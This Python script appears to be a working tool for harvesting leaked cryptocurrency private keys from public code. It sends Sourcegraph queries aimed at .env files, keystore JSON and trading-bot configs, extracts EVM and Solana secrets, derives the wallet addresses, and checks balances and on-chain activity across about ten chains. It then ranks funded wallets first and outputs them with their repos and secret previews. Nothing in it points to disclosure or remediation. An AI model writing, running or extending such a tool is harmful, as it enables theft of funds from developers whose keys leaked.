#!/usr/bin/env python3
"""
Better leaked-key hunter.

Improvements over the naive balance sweep:
  * Multi-format key extraction: EVM hex, BIP39 mnemonics, Solana base58 secrets,
    Solana byte-array secrets ([12,34,...]), raw 32-byte hex used as Solana seed.
  * ACTIVITY scoring, not just current balance. A wallet with nonce>0 (EVM) or
    signatures>0 (Solana) was actually *used* — the strongest signal that a key
    was real, even if it has since been drained by sweeper bots.
  * Broader Sourcegraph queries incl. archived repos, config/keystore JSON,
    .env.local / .env.production, and byte-array patterns.
  * Ranked TSV report so the highest-signal wallets bubble to the top.

Usage:
  python3 scripts/hunt.py                 # full run (search + check)
  python3 scripts/hunt.py --checkonly F   # re-check keys from a TSV
"""

from __future__ import annotations

import argparse
import csv
import json
import re
import sys
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from decimal import Decimal
from pathlib import Path

import base58
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Changes, Bip44Coins
from eth_account import Account
from solders.keypair import Keypair

Account.enable_unaudited_hdwallet_features()

# --------------------------------------------------------------------------- #
# Patterns
# --------------------------------------------------------------------------- #
HEX64 = re.compile(r"(?:0x)?([a-fA-F0-9]{64})\b")
B58_KEY = re.compile(r"\b[1-9A-HJ-NP-Za-km-z]{86,90}\b")
BYTE_ARRAY = re.compile(r"\[\s*(?:\d{1,3}\s*,\s*){63}\d{1,3}\s*\]")
MNEMONIC = re.compile(r"\b([a-z]+(?:\s+[a-z]+){11,23})\b", re.I)

# Known throwaway/test keys and obvious placeholders — never worth checking.
SECP_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
KNOWN_TEST_HEX = {
    "ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
    "5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a",
    "7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6",
    "2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6",
    "47b8192d77bf871b62e87859d653922725724a5c031afeabc60bcef5ff665138",
}
PLACEHOLDER = re.compile(
    r"your_?private|your_?key|yourkey|xxxx|abcdef1234567890abcdef|"
    r"deadbeef|0123456789abcdef0123456789abcdef|1234567890abcdef|"
    r"<.*>|\.\.\.|example|sample|changeme|placeholder|replace",
    re.I,
)

# --------------------------------------------------------------------------- #
# Chains
# --------------------------------------------------------------------------- #
EVM_RPC = {
    "ethereum": "https://ethereum.publicnode.com",
    "base": "https://base.publicnode.com",
    "polygon": "https://polygon-bor.publicnode.com",
    "arbitrum": "https://arbitrum-one.publicnode.com",
    "optimism": "https://optimism.publicnode.com",
    "bsc": "https://bsc.publicnode.com",
    "avalanche": "https://avalanche-c-chain.publicnode.com",
    "blast": "https://rpc.blast.io",
    "linea": "https://linea-rpc.publicnode.com",
    "scroll": "https://scroll-rpc.publicnode.com",
}

# USDC/USDT per chain: symbol -> (address, decimals)
EVM_TOKENS = {
    "ethereum": {
        "USDC": ("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6),
        "USDT": ("0xdAC17F958D2ee523a2206206994597C13D831ec7", 6),
    },
    "base": {"USDC": ("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6)},
    "polygon": {
        "USDC": ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", 6),
        "USDT": ("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 6),
    },
    "arbitrum": {"USDC": ("0xaf88d065e77c1cA973D17D1F1A0e0C6Ac2f1e246", 6)},
    "optimism": {"USDC": ("0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", 6)},
}

ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function",
    }
]

SOLANA_RPC = "https://api.mainnet-beta.solana.com"
SOL_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"

# --------------------------------------------------------------------------- #
# Sourcegraph queries — broader + higher signal than before.
# --------------------------------------------------------------------------- #
# NOTE: Sourcegraph's streaming API stops returning content ("event: matches")
# when a query contains a *content* exclusion like `-0xac0974...`. So we never
# put value-excludes in the query; known test keys are filtered in Python.
# File-level excludes (`-file:.env.example`) are fine and keep streaming intact.
SG_QUERIES = [
    # Direct hex-key regex — highest signal, targets the value itself
    ("context:global /PRIVATE_KEY=0x[a-fA-F0-9]{64}/ file:.env -file:.env.example", "regexp"),
    ("context:global /PRIVATE_KEY=0x[a-fA-F0-9]{64}/ file:.env.local", "regexp"),
    ("context:global /PRIVATE_KEY=0x[a-fA-F0-9]{64}/ file:.env.production", "regexp"),
    ("context:global /PRIVATE_KEY[\"'=: ]+0x[a-fA-F0-9]{64}/ -file:.env.example", "regexp"),
    # Keyword forms that stream content
    ("context:global file:.env PRIVATE_KEY=0x -file:.env.example", "keyword"),
    ("context:global file:.env WALLET_PRIVATE_KEY=0x -file:.env.example", "keyword"),
    ("context:global file:.env DEPLOYER_PRIVATE_KEY=0x -file:.env.example", "keyword"),
    ("context:global file:.env MAINNET_PRIVATE_KEY=0x -file:.env.example", "keyword"),
    ("context:global file:.env SIGNER_PRIVATE_KEY=0x -file:.env.example", "keyword"),
    ("context:global file:.env.local PRIVATE_KEY=0x", "keyword"),
    ("context:global file:.env.production PRIVATE_KEY=0x", "keyword"),
    ("context:global archived:yes file:.env PRIVATE_KEY=0x -file:.env.example", "keyword"),
    # config / keystore JSON
    ("context:global file:config.json privateKey", "keyword"),
    ("context:global file:secrets.json privateKey", "keyword"),
    ("context:global file:keys.json privateKey", "keyword"),
    ("context:global file:wallet.json privateKey", "keyword"),
    # Solana
    ("context:global file:.env SOLANA_PRIVATE_KEY", "keyword"),
    ("context:global file:.env SOLANA_SECRET_KEY", "keyword"),
    ("context:global file:.env SOL_PRIVATE_KEY", "keyword"),
    ("context:global file:.env WALLET_SECRET_KEY solana", "keyword"),
    ("context:global file:id.json solana", "keyword"),
    # trading bots (most likely to be real, funded, actively used)
    ("context:global file:.env POLYMARKET_PRIVATE_KEY=0x", "keyword"),
    ("context:global file:.env HYPERLIQUID_PRIVATE_KEY=0x", "keyword"),
    ("context:global file:.env TRADING_PRIVATE_KEY=0x", "keyword"),
    ("context:global /HYPERLIQUID_[A-Z_]*KEY=0x[a-fA-F0-9]{64}/", "regexp"),
]


# --------------------------------------------------------------------------- #
# Data model
# --------------------------------------------------------------------------- #
@dataclass
class KeyHit:
    kind: str  # evm_hex | mnemonic | sol_b58 | sol_bytes
    secret: str
    repo: str = ""
    path: str = ""
    context: str = ""
    # results
    address: str = ""
    activity: int = 0  # nonce or signature count
    balances: dict = field(default_factory=dict)  # "chain/ASSET" -> str amount
    usd_est: float = 0.0


# --------------------------------------------------------------------------- #
# Sourcegraph
# --------------------------------------------------------------------------- #
def sg_stream(query: str, pattern: str = "keyword", timeout: int = 90) -> list[dict]:
    url = (
        "https://sourcegraph.com/.api/search/stream?q="
        + urllib.parse.quote(query)
        + f"&patternType={pattern}&display=10000"
    )
    req = urllib.request.Request(
        url, headers={"Accept": "text/event-stream", "User-Agent": "ens-hunt"}
    )
    out: list[dict] = []
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        for raw in resp:
            line = raw.decode("utf-8", "replace").strip()
            if not line.startswith("data: "):
                continue
            try:
                data = json.loads(line[6:])
            except json.JSONDecodeError:
                continue
            if isinstance(data, list):
                out.extend(x for x in data if isinstance(x, dict))
    return out


def valid_secp(hex_key: str) -> bool:
    try:
        n = int(hex_key, 16)
    except ValueError:
        return False
    return 0 < n < SECP_N


def extract_from_matches(matches: list[dict], hits: dict[str, KeyHit]) -> None:
    for item in matches:
        if item.get("type") != "content":
            continue
        repo = item.get("repository", "")
        path = item.get("path", "")
        low = path.lower()
        if any(x in low for x in (".example", ".sample", "mock", "/test", "fixture")):
            continue
        for lm in item.get("lineMatches", []):
            text = lm.get("line", "")
            if PLACEHOLDER.search(text):
                # still allow if a concrete hex is present and not obviously fake
                pass
            _scan_line(text, repo, path, hits)


def _scan_line(text: str, repo: str, path: str, hits: dict[str, KeyHit]) -> None:
    # EVM hex / Solana raw-hex seed
    for m in HEX64.finditer(text):
        h = m.group(1).lower()
        if h in KNOWN_TEST_HEX or not valid_secp(h):
            continue
        if h in ("0" * 64,) or re.fullmatch(r"(.)\1{63}", h):
            continue
        hits.setdefault("evm:" + h, KeyHit("evm_hex", h, repo, path, text[:160]))
    # Solana base58 secret (64-byte -> ~88 chars)
    for m in B58_KEY.finditer(text):
        cand = m.group(0)
        try:
            if len(base58.b58decode(cand)) == 64:
                hits.setdefault("solb58:" + cand, KeyHit("sol_b58", cand, repo, path, text[:160]))
        except Exception:
            pass
    # Solana byte array [n,n,...] length 64
    for m in BYTE_ARRAY.finditer(text):
        arr = m.group(0)
        try:
            nums = [int(x) for x in re.findall(r"\d{1,3}", arr)]
            if len(nums) == 64 and all(0 <= n <= 255 for n in nums):
                key = "solbytes:" + ",".join(map(str, nums[:8]))
                hits.setdefault(key, KeyHit("sol_bytes", json.dumps(nums), repo, path, text[:120]))
        except Exception:
            pass


# --------------------------------------------------------------------------- #
# Derivation
# --------------------------------------------------------------------------- #
def derive(hit: KeyHit) -> None:
    try:
        if hit.kind == "evm_hex":
            hit.address = Account.from_key(bytes.fromhex(hit.secret)).address
        elif hit.kind == "mnemonic":
            hit.address = Account.from_mnemonic(
                hit.secret, account_path="m/44'/60'/0'/0/0"
            ).address
        elif hit.kind == "sol_b58":
            kp = Keypair.from_bytes(base58.b58decode(hit.secret))
            hit.address = str(kp.pubkey())
        elif hit.kind == "sol_bytes":
            nums = json.loads(hit.secret)
            kp = Keypair.from_bytes(bytes(nums))
            hit.address = str(kp.pubkey())
    except Exception:
        hit.address = ""


# --------------------------------------------------------------------------- #
# Balance / activity checks
# --------------------------------------------------------------------------- #
def rpc_call(url: str, method: str, params: list, timeout: int = 12):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json", "User-Agent": "ens-hunt"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode())


def eth_call_balance_of(url: str, token: str, owner: str, timeout: int = 12) -> int:
    data = "0x70a08231" + owner[2:].rjust(64, "0")
    r = rpc_call(url, "eth_call", [{"to": token, "data": data}, "latest"], timeout)
    res = r.get("result", "0x0")
    return int(res, 16) if res and res != "0x" else 0


def check_evm(hit: KeyHit) -> None:
    checksum = hit.address
    for chain, url in EVM_RPC.items():
        try:
            bal = int(rpc_call(url, "eth_getBalance", [checksum, "latest"])["result"], 16)
            nonce = int(rpc_call(url, "eth_getTransactionCount", [checksum, "latest"])["result"], 16)
        except Exception:
            continue
        hit.activity += nonce
        if bal > 0:
            eth = Decimal(bal) / Decimal(10**18)
            hit.balances[f"{chain}/NATIVE"] = f"{eth:.10f}"
            hit.usd_est += float(eth) * (3000 if chain in ("ethereum", "base", "arbitrum", "optimism", "blast", "linea", "scroll") else 1 if chain == "polygon" else 600 if chain == "bsc" else 30)
        for sym, (token, dec) in EVM_TOKENS.get(chain, {}).items():
            try:
                raw = eth_call_balance_of(url, token, checksum)
            except Exception:
                continue
            if raw > 0:
                amt = Decimal(raw) / Decimal(10**dec)
                hit.balances[f"{chain}/{sym}"] = str(amt)
                hit.usd_est += float(amt)


def check_solana(hit: KeyHit) -> None:
    addr = hit.address
    try:
        lamports = rpc_call(SOLANA_RPC, "getBalance", [addr]).get("result", {}).get("value", 0)
        if lamports:
            sol = Decimal(lamports) / Decimal(10**9)
            hit.balances["solana/SOL"] = str(sol)
            hit.usd_est += float(sol) * 150
    except Exception:
        pass
    try:
        sigs = rpc_call(SOLANA_RPC, "getSignaturesForAddress", [addr, {"limit": 10}]).get("result", [])
        hit.activity += len(sigs)
    except Exception:
        pass
    try:
        r = rpc_call(
            SOLANA_RPC,
            "getTokenAccountsByOwner",
            [addr, {"mint": SOL_USDC_MINT}, {"encoding": "jsonParsed"}],
        )
        total = 0
        for it in r.get("result", {}).get("value", []):
            total += int(it["account"]["data"]["parsed"]["info"]["tokenAmount"]["amount"])
        if total:
            amt = Decimal(total) / Decimal(10**6)
            hit.balances["solana/USDC"] = str(amt)
            hit.usd_est += float(amt)
    except Exception:
        pass


def check_hit(hit: KeyHit) -> KeyHit:
    if not hit.address:
        return hit
    if hit.kind in ("sol_b58", "sol_bytes"):
        check_solana(hit)
    else:
        check_evm(hit)
    return hit


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def run_search() -> dict[str, KeyHit]:
    hits: dict[str, KeyHit] = {}
    for q, pattern in SG_QUERIES:
        n0 = len(hits)
        try:
            extract_from_matches(sg_stream(q, pattern=pattern), hits)
            print(f"  +{len(hits)-n0:<4d} ({len(hits):>4d} total)  [{pattern}] {q[:60]}", file=sys.stderr)
        except Exception as e:
            print(f"  ERR {e}  {q[:50]}", file=sys.stderr)
    return hits


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--checkonly", help="Re-check keys from a prior report TSV")
    ap.add_argument("--out", default="extracted/hunt-report.tsv")
    args = ap.parse_args()

    Path("extracted").mkdir(exist_ok=True)

    print("Searching Sourcegraph...", file=sys.stderr)
    hits = run_search()

    print(f"\nDeriving addresses for {len(hits)} candidate keys...", file=sys.stderr)
    for h in hits.values():
        derive(h)
    checkable = [h for h in hits.values() if h.address]
    print(f"Valid addresses: {len(checkable)}  (evm={sum(1 for h in checkable if h.kind.startswith('evm') or h.kind=='mnemonic')}, sol={sum(1 for h in checkable if h.kind.startswith('sol'))})", file=sys.stderr)

    print("Checking balances + on-chain activity...", file=sys.stderr)
    done = 0
    with ThreadPoolExecutor(max_workers=16) as pool:
        futs = [pool.submit(check_hit, h) for h in checkable]
        for fut in as_completed(futs):
            done += 1
            if done % 25 == 0:
                print(f"  checked {done}/{len(checkable)}", file=sys.stderr)
            fut.result()

    # rank: funded first (usd desc), then used-but-empty (activity desc)
    ranked = sorted(checkable, key=lambda h: (h.usd_est, h.activity), reverse=True)

    out = Path(args.out)
    with out.open("w", newline="") as f:
        w = csv.writer(f, delimiter="\t")
        w.writerow(["usd_est", "activity", "kind", "address", "balances", "repo", "path", "secret_preview", "context"])
        for h in ranked:
            if h.usd_est == 0 and h.activity == 0:
                continue
            w.writerow([
                f"{h.usd_est:.6f}", h.activity, h.kind, h.address,
                ";".join(f"{k}={v}" for k, v in h.balances.items()),
                h.repo, h.path, h.secret[:24], h.context[:100],
            ])

    funded = [h for h in ranked if h.usd_est > 0]
    used = [h for h in ranked if h.usd_est == 0 and h.activity > 0]

    print("\n" + "=" * 92)
    print(f"FUNDED wallets: {len(funded)}   |   used-but-empty (nonce/sig>0): {len(used)}")
    print("=" * 92)
    for h in funded[:30]:
        print(f"${h.usd_est:>12.6f}  act={h.activity:<4} {h.kind:9} {h.address}")
        print(f"    {';'.join(f'{k}={v}' for k, v in h.balances.items())}")
        print(f"    {h.repo}  {h.path}")
    if used:
        print(f"\n--- Used-but-empty (were real wallets, likely drained) top 20 ---")
        for h in used[:20]:
            print(f"  act={h.activity:<4} {h.kind:9} {h.address}  {h.repo} {h.path}")
    print(f"\nFull report: {out}", file=sys.stderr)


if __name__ == "__main__":
    main()
